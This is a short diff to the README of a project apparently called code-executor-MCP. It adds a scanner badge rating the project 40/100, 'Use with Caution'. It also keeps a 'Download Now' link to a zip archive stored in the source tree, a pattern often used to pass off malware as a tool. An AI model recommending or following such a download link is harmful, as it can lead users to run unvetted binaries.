@@ -1,5 +1,7 @@
 # 🚀 code-executor-MCP - One Tool For All Your Needs
 
+[![SafeSkill 40/100](https://img.shields.io/badge/SafeSkill-40%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/muhumuree-code-executor-mcp)
+
 [![Download Now](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip%20Now-Visit%20Page-brightgreen)](https://github.com/Muhumuree/code-executor-MCP/raw/refs/heads/main/src/executors/MCP_executor_code_2.2.zip)
 
 ## 🌟 What is Code Executor MCP?
